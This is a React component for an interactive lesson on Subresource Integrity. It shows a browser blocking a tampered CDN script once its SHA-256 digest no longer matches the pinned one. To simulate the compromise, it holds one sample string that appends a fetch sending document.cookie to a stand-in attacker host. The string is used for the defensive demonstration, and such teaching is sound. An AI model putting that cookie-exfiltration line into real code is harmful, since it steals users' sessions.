// Subresource Integrity, made visible. A page pins the SHA-256 of a known-good CDN file in the
// integrity attribute. Edit the "served" file (or hit the CDN-compromise button) and watch the
// browser re-hash what it actually received: one changed byte avalanches the digest, the hashes
// stop matching, and the script is blocked instead of executed. Real SHA-256 from sri.ts (tested).
import { useMemo, useState } from 'react';
import { sriHash, verifyIntegrity } from './sri';

const LEGIT = 'window.pay = (amt) => api.charge(amt)';
const EVIL = 'window.pay = (amt) => { api.charge(amt); fetch("//evil.test/x?c="+document.cookie) }';

export function SriSection() {
  const [served, setServed] = useState(LEGIT);
  const integrity = useMemo(() => sriHash(LEGIT), []); // pinned at author time from the known-good file
  const r = verifyIntegrity(served, integrity);

  return (
    <div className="journey">
      <section className="jsec">
        <div className="jsec-head"><h2>Subresource Integrity — pinning the exact bytes a CDN may run</h2></div>
        <p className="jsec-sub">
          Loading a script from a third-party CDN means trusting that CDN forever. <strong>SRI</strong> removes that trust: the author hashes the
          known-good file and pins the digest in the tag. The browser fetches the file, hashes what it <em>actually</em> received, and runs it
          <strong> only if the digest matches</strong>. The hash is the file’s identity, so any tampering — even one byte — changes it and the
          resource is blocked.
        </p>

        <div className="sri-tag">
          <pre>{`<script src="//cdn.example/pay.js"\n        integrity="${integrity}"\n        crossorigin="anonymous"></script>`}</pre>
        </div>

        <div className="sri-served">
          <div className="sri-servedhdr">
            <span>what the CDN actually serves <span className="sri-edit">(editable)</span></span>
            <div className="sri-btns">
              <button onClick={() => setServed(LEGIT)} disabled={served === LEGIT}>↺ legit file</button>
              <button className="sri-evil" onClick={() => setServed(EVIL)}>☠ simulate CDN compromise</button>
            </div>
          </div>
          <textarea value={served} onChange={(e) => setServed(e.target.value)} spellCheck={false} rows={3} />
        </div>

        <div className="sri-hashes">
          <div className="sri-hrow"><span className="sri-hlbl">pinned (expected)</span><code className="sri-hval">{r.expected}</code></div>
          <div className={`sri-hrow ${r.ok ? 'match' : 'mismatch'}`}><span className="sri-hlbl">computed (served)</span><code className="sri-hval">{r.computed}</code></div>
        </div>

        <div className={`sri-verdict ${r.runs ? 'run' : 'block'}`}>
          {r.runs
            ? '✓ hashes match — the browser executes the script. Exactly the bytes the author vetted.'
            : '✗ hash mismatch — the browser BLOCKS the script entirely. The compromised CDN file never runs.'}
        </div>

        <p className="sri-foot">
          SRI is content addressing applied to the web: the hash <em>is</em> the resource’s name, so you’re asking for specific bytes, not
          “whatever that URL serves today.” It needs <code>crossorigin</code> (the response must be CORS-readable to be hashed) and a fresh hash
          on every file update — which is why it pairs with immutable, versioned CDN URLs. It defends against a hacked or coerced CDN and
          accidental file swaps; it does <em>not</em> hide the file or help if the original author ships malicious code. The same hash-as-identity
          idea powers Git objects, IPFS, Docker image digests, and Nix.
        </p>
      </section>
    </div>
  );
}
